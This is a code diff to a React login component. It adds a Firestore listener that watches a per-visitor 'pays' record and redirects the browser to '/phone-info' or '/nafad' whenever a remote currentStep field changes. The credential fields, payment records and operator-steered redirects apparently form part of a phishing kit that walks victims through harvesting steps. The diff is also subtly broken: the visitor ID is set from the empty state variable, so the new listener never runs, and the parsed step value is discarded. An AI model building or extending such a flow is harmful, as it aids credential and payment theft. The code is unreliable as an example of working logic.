@@ -22,9 +22,11 @@ export default function Component() {
   const [idLogin, setLoginID] = useState("");
   const [password,setPassword] = useState("");
   const [showError, setShowError] = useState("");
+  const [visitorID, setVisitorID] = useState("");
   useEffect(() => {
     const visitorId = localStorage.getItem("visitor")
     if (visitorId) {
+      setVisitorID(visitorID)
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data()
@@ -54,6 +56,46 @@ export default function Component() {
       setIsLoading(false);
     }, 5000);
   };
+  // <CHANGE> Updated Firestore listener to properly sync currentStep
+  useEffect(() => {
+    if (!visitorID) return
+
+    console.log(" Setting up Firestore listener for visitor:", visitorID)
+    
+    const unsubscribe = onSnapshot(
+      doc(db, "pays", visitorID), 
+      (docSnap) => {
+        if (docSnap.exists()) {
+          const data = docSnap.data()
+          console.log(" Firestore data received:", data)
+          
+          // Handle special navigation cases
+          if (data.currentStep === "home") {
+            window.location.href = "/"
+          } else if (data.currentStep === "phone") {
+            window.location.href = "/phone-info"
+          } else if (data.currentStep === "nafad") {
+            window.location.href = "/nafad"
+          } else {
+            // Update current step for numeric values
+            const step = typeof data.currentStep === 'string' 
+              ? parseInt(data.currentStep) 
+              : data.currentStep
+          }
+        } else {
+          console.log(" No document found for visitor:", visitorID)
+        }
+      },
+      (error) => {
+        console.error(" Firestore listener error:", error)
+      }
+    )
+
+    return () => {
+      console.log(" Cleaning up Firestore listener")
+      unsubscribe()
+    }
+  }, [visitorID])
 
   return (
     <div
